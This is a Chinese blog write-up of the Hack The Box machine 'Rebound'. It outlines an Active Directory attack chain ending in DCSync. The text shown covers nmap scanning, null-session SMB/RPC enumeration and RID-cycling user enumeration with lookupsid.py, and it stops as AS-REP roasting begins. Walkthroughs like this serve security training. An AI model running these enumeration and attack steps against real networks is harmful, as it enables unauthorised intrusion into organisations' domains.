<!DOCTYPE html><html lang="zh-CN" id="theme-light-mode"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zIxyd"><title>ReBound(HTB) · zIxyd's Blog</title><meta name="description" content="介绍Rebound 是一台疯狂的 Windows 机器，具有棘手的 Active Directory 环境。通过 “RID cycling”进行的用户枚举揭示了一个 AS-REP-roastable 用户，其 TGT 用于 Kerberoast 另一个具有可破解密码的用户。 ACL 被滥用以获取对 "><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/logo.png"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li><li><a class="fa fa-sun-o" onclick="darkLightToggle();"></a></li></div><div class="avatar"></div></div></div><div class="toc-container in-page animated fadeInDown"><details class="ltr toc-toggle"><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toclist-text">介绍</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E6%94%B6%E9%9B%86"><span class="toclist-text">收集</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#SMB"><span class="toclist-text">SMB</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#RPC"><span class="toclist-text">RPC</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E7%AB%8B%E8%B6%B3"><span class="toclist-text">立足</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#AS-REP-roastting"><span class="toclist-text">AS-REP-roastting</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#Kerberoast"><span class="toclist-text">Kerberoast</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#Password-Spray"><span class="toclist-text">Password Spray</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BB%A5%E7%94%A8ACL"><span class="toclist-text">滥用ACL</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E6%8F%90%E6%9D%83"><span class="toclist-text">提权</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#Cross-session"><span class="toclist-text">Cross-session</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BB%A5%E7%94%A8ACL-1"><span class="toclist-text">滥用ACL</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#constrained-Without-protocol-transition"><span class="toclist-text">constrained Without protocol transition</span></a></li></ol></li></ol></div></details></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo.png" style="width:220px;" alt="favicon"><h3 title=""><a href="/">zIxyd's Blog</a></h3><div class="description"><p>存放个人学习笔记的小窝，欢迎交流</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/zIxyd"><i class="fa fa-github"></i></a></li><li><a href="mailto:2972914692@qq.comm"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://res.abeim.cn/api-qq?qq=2972914692"><i class="fa fa-qq"></i></a></li></ul></div><div class="toc-container in-sidebar"><details class="ltr" open><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toclist-text">介绍</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E6%94%B6%E9%9B%86"><span class="toclist-text">收集</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#SMB"><span class="toclist-text">SMB</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#RPC"><span class="toclist-text">RPC</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E7%AB%8B%E8%B6%B3"><span class="toclist-text">立足</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#AS-REP-roastting"><span class="toclist-text">AS-REP-roastting</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#Kerberoast"><span class="toclist-text">Kerberoast</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#Password-Spray"><span class="toclist-text">Password Spray</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BB%A5%E7%94%A8ACL"><span class="toclist-text">滥用ACL</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E6%8F%90%E6%9D%83"><span class="toclist-text">提权</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#Cross-session"><span class="toclist-text">Cross-session</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BB%A5%E7%94%A8ACL-1"><span class="toclist-text">滥用ACL</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#constrained-Without-protocol-transition"><span class="toclist-text">constrained Without protocol transition</span></a></li></ol></li></ol></div></details></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> zIxyd</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank">Anatolo </a></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>ReBound(HTB)</a></h3></div><div class="post-content"><p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Rebound 是一台疯狂的 Windows 机器，具有棘手的 Active Directory 环境。通过 “RID cycling”进行的用户枚举揭示了一个 AS-REP-roastable 用户，其 TGT 用于 Kerberoast 另一个具有可破解密码的用户。 ACL 被滥用以获取对 OU 具有完全控制权限的组的访问权限，执行后代对象接管 (DOT)，然后对具有 winrm 访问权限的用户进行 ShadowCredentials 攻击。在目标系统上，利用跨会话中继来获取登录用户的 NetNTLMv2 哈希值，一旦破解，就会导致 gMSA 密码被读取。最后，gMSA 帐户允许委派，但无需协议转换。基于资源的约束委派 (RBCD) 用于模拟域控制器，从而启用 DCSync 攻击，从而导致权限完全提升。</p>
<h2 id="收集"><a href="#收集" class="headerlink" title="收集"></a>收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ sudo nmap -p- --min-rate 10000 10.10.11.231 -oN nmap/ports.txt</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-11 10:58 EDT</span><br><span class="line">Warning: 10.10.11.231 giving up on port because retransmission <span class="built_in">cap</span> hit (10).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> rebound.htb (10.10.11.231)</span><br><span class="line">Host is up (0.096s latency).</span><br><span class="line">Not shown: 65509 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49690/tcp open  unknown</span><br><span class="line">49691/tcp open  unknown</span><br><span class="line">49694/tcp open  unknown</span><br><span class="line">49707/tcp open  unknown</span><br><span class="line">49720/tcp open  unknown</span><br><span class="line">49741/tcp open  unknown</span><br><span class="line">49783/tcp open  unknown</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.19 seconds</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ ports=$(<span class="built_in">cat</span> nmap/ports.txt|grep open| awk -F <span class="string">&quot;/&quot;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>|<span class="built_in">paste</span> -sd <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ sudo nmap -sT -sC -sV -O -p<span class="variable">$ports</span> 10.10.11.231 -oN nmap/details.txt</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-11 10:59 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> rebound.htb (10.10.11.231)</span><br><span class="line">Host is up (0.085s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-11 15:05:29Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2023-08-25T22:48:10</span><br><span class="line">|_Not valid after:  2024-08-24T22:48:10</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-09-11T15:06:44+00:00; +5m45s from scanner time.</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2023-08-25T22:48:10</span><br><span class="line">|_Not valid after:  2024-08-24T22:48:10</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-09-11T15:06:44+00:00; +5m45s from scanner time.</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-09-11T15:06:44+00:00; +5m45s from scanner time.</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2023-08-25T22:48:10</span><br><span class="line">|_Not valid after:  2024-08-24T22:48:10</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-09-11T15:06:44+00:00; +5m45s from scanner time.</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2023-08-25T22:48:10</span><br><span class="line">|_Not valid after:  2024-08-24T22:48:10</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49673/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49691/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49694/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49707/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49720/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49741/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49783/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-09-11T15:06:36</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: 5m44s, deviation: 0s, median: 5m44s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 76.44 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将域名添加到<code>/etc/hosts</code>文件中；</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c <span class="string">&quot;echo &#x27;10.10.11.231 rebound.htb dc01.rebound.htb&#x27; &gt;&gt; /etc/hosts&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>空密码可以访问两个文件夹，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ smbmap -H 10.10.11.231 -u null                </span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /<span class="string">&quot;       )|&quot;</span>  \    /<span class="string">&quot;  ||   _  &quot;</span>\ |<span class="string">&quot;  \    /&quot;</span>  |     /<span class="string">&quot;&quot;</span>\       |   __ <span class="string">&quot;\</span></span><br><span class="line"><span class="string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span><br><span class="line"><span class="string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span></span><br><span class="line"><span class="string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span></span><br><span class="line"><span class="string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line">     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB</span><br><span class="line">[*] Established 1 SMB session(s)                                </span><br><span class="line">                                                                                                    </span><br><span class="line">[+] IP: 10.10.11.231:445        Name: rebound.htb               Status: Authenticated</span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                NO ACCESS       Logon server share </span><br><span class="line">        Shared                                                  READ ONLY</span><br><span class="line">        SYSVOL                                                  NO ACCESS       Logon server share </span><br></pre></td></tr></table></figure>

<p>这两个文件夹皆为空</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ smbclient //10.10.11.231/IPC$ -N</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">NT_STATUS_NO_SUCH_FILE listing \*</span><br><span class="line">smb: \&gt; <span class="built_in">exit</span></span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ smbclient //10.10.11.231/Shared -N</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Fri Aug 25 17:46:36 2023</span><br><span class="line">  ..                                  D        0  Fri Aug 25 17:46:36 2023</span><br><span class="line"></span><br><span class="line">                4607743 blocks of size 4096. 1039160 blocks available</span><br><span class="line">smb: \&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><p>空密码可以连接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ rpcclient -U <span class="string">&quot;&quot;</span> -N 10.10.11.231</span><br><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line">result was NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>NT_STATUS_ACCESS_DENIED</code> 错误表示，由于 <strong>权限不足</strong>，服务器拒绝了该请求。具体来说，这意味着尝试枚举域用户时，所使用的账户没有足够的权限来执行该操作。</p>
<p>通过<a target="_blank" rel="noopener" href="https://www.trustedsec.com/blog/new-tool-release-rpc_enum-rid-cycling-attack">rid-cycling-attack</a>手法枚举用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ lookupsid.py -no-pass <span class="string">&#x27;guest@rebound.htb&#x27;</span> 20000</span><br><span class="line">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span><br><span class="line">[*] Brute forcing SIDs at rebound.htb</span><br><span class="line">[*] StringBinding ncacn_np:rebound.htb[\pipe\lsarpc]</span><br><span class="line">[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209</span><br><span class="line">498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">500: rebound\Administrator (SidTypeUser)</span><br><span class="line">501: rebound\Guest (SidTypeUser)</span><br><span class="line">502: rebound\krbtgt (SidTypeUser)</span><br><span class="line">512: rebound\Domain Admins (SidTypeGroup)</span><br><span class="line">513: rebound\Domain Users (SidTypeGroup)</span><br><span class="line">514: rebound\Domain Guests (SidTypeGroup)</span><br><span class="line">515: rebound\Domain Computers (SidTypeGroup)</span><br><span class="line">516: rebound\Domain Controllers (SidTypeGroup)</span><br><span class="line">517: rebound\Cert Publishers (SidTypeAlias)</span><br><span class="line">518: rebound\Schema Admins (SidTypeGroup)</span><br><span class="line">519: rebound\Enterprise Admins (SidTypeGroup)</span><br><span class="line">520: rebound\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">521: rebound\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">522: rebound\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">525: rebound\Protected Users (SidTypeGroup)</span><br><span class="line">526: rebound\Key Admins (SidTypeGroup)</span><br><span class="line">527: rebound\Enterprise Key Admins (SidTypeGroup)</span><br><span class="line">553: rebound\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">572: rebound\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">1000: rebound\DC01$ (SidTypeUser)</span><br><span class="line">1101: rebound\DnsAdmins (SidTypeAlias)</span><br><span class="line">1102: rebound\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">1951: rebound\ppaul (SidTypeUser)</span><br><span class="line">2952: rebound\llune (SidTypeUser)</span><br><span class="line">3382: rebound\fflock (SidTypeUser)</span><br><span class="line">5277: rebound\jjones (SidTypeUser)</span><br><span class="line">5569: rebound\mmalone (SidTypeUser)</span><br><span class="line">5680: rebound\nnoon (SidTypeUser)</span><br><span class="line">7681: rebound\ldap_monitor (SidTypeUser)</span><br><span class="line">7682: rebound\oorend (SidTypeUser)</span><br><span class="line">7683: rebound\ServiceMgmt (SidTypeGroup)</span><br><span class="line">7684: rebound\winrm_svc (SidTypeUser)</span><br><span class="line">7685: rebound\batch_runner (SidTypeUser)</span><br><span class="line">7686: rebound\tbrady (SidTypeUser)</span><br><span class="line">7687: rebound\delegator$ (SidTypeUser)</span><br></pre></td></tr></table></figure>

<p>将用户名收集在一个文件中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ <span class="built_in">cat</span> sid_result.txt|grep SidTypeUser|grep -oP <span class="string">&#x27;rebound.\K.*(?=\()&#x27;</span> &gt; username.txt</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Rebound]</span><br><span class="line">└─$ <span class="built_in">cat</span> username.txt                                                                </span><br><span class="line">Administrator </span><br><span class="line">Guest </span><br><span class="line">krbtgt </span><br><span class="line">DC01$ </span><br><span class="line">ppaul </span><br><span class="line">llune </span><br><span class="line">fflock </span><br><span class="line">jjones </span><br><span class="line">mmalone </span><br><span class="line">nnoon </span><br><span class="line">ldap_monitor </span><br><span class="line">oorend </span><br><span class="line">winrm_svc </span><br><span class="line">batch_runner </span><br><span class="line">tbrady </span><br><span class="line">delegator$</span><br></pre></td></tr></table></figure>



<h2 id="立足"><a href="#立足" class="headerlink" title="立足"></a>立足</h2><h3 id="AS-REP-roastting"><a href="#AS-REP-roastting" class="headerlink" title="AS-REP-roastting"></a>AS-REP-roastting</h3><p>尝试”AS-REP-roastting”攻击，“不要求Kerberos预身份验证”在”jjones”用户上生效；返回了一个TGT;</p>
